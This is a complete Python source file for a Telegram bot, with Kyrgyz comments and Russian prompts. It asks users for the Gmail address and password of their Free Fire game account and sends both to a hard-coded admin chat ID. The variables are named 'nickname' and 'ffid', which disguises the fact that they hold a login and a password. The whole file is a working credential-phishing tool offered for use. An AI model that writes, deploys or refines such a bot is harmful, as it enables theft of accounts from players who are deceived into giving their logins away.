from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import os

TOKEN = os.getenv("Free_fire_kg_bot")
ADMIN_ID = 6366420482  # Бул жерге өз ID'иңди жаз

NICKNAME, FFID = range(2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Free Fire Gmail напиши!! 👇")
    return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["nickname"] = update.message.text
    await update.message.reply_text("Free Fire пароль напиши!! 👇")
    return FFID

async def get_ffid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    nickname = context.user_data.get("nickname")
    ffid = update.message.text

    # Админге жиберүү
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔥 Жаңы заявка!\n\nGmail: {nickname}\nPass: {ffid}"
    )

    await update.message.reply_text("Скоро ответим✅")
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено")
    return ConversationHandler.END


app = ApplicationBuilder().token(TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CommandHandler("start", start)],
    states={
        NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
        FFID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ffid)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

app.add_handler(conv_handler)

app.run_polling()